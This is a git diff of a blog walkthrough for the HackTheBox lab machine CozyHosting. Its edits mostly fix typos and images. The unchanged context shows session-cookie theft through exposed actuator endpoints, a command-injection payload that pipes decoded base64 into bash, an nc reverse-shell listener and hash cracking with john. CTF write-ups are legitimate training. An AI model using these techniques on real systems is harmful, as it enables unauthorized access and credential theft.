@@ -8,7 +8,7 @@ export const meta = {
     tags: ["hacking", "pentesting", "hackthebox"]
 }
 
-![image of the machine](/assets/blog/posts/cozyhosting/profile.png)
+![image of the machine](/assets/blog/posts/cozyhosting/cozyhosting.png)
 
 CozyHosting is a seasonal machine.
 
@@ -16,7 +16,7 @@ CozyHosting is a seasonal machine.
 - OS: Linux
 - Creator: [commandercool](https://app.hackthebox.com/users/1005191)
 
-**In this walkthrough, important information such as hashes, passwords, etc. are censored (the length of the censored information can not correspond to the real length of the information)**
+**In this walkthrough, important information such as hashes, passwords, etc. are censored (the length of the censored information cannot correspond to the real length of the information)**
 
 # Enumeration
 
@@ -41,7 +41,7 @@ The first thing you can see is the `Login` button, when you click it, you will b
 
 I opened the dev tools and inspected the cookies, but nothing seemed to be present.
 
-So I  tried to log in with random credentials and a cookie will be created.
+So I tried to log in with random credentials and a cookie will be created.
 
 ![image of the machine](/assets/blog/posts/cozyhosting/cookie.png)
 
@@ -59,11 +59,14 @@ http://cozyhosting.htb/actuator/sessions
 
 ![image of the machine](/assets/blog/posts/cozyhosting/sessions.png)
 
-As you can see on these endpoints we can get the cookie value of the user `kanderson`.
+As you can see on these endpoints, we can get the cookie value of the user `kanderson`.
 So if we replace our cookie value with this and refresh the login page... we are in!
 
 # Reverse shell
 In the admin panel, there is a form.
+
+![image of the machine](/assets/blog/posts/cozyhosting/form.png)
+
 So I opened `BurpSuite` and started making some attempts.
 
 As you can see, if we leave the username blank, an interesting thing happens.
@@ -105,7 +108,7 @@ host=127.0.0.1&username=`echo${IFS}base64Payload|base64${IFS}-d|bash`
 
 Clearly, before submitting the payload above, you have to open a listener on your local host.
 
-**If you have a firewall running on your computer, remember to disable/configure it.
+**If you have a firewall running on your computer, remember to disable/configure it.**
 
 ```bash title="localhost"
 nc -lvp 4444
@@ -172,7 +175,7 @@ To crack the hash we use john, we put the admin hash in a file named `hash.txt` 
 john -wordlist=rockyou.txt hash.txt
 ```
 
-When john has finished we use
+When john has finished, we use
 
 ```bash title="localhost"
 john --show hash.txt
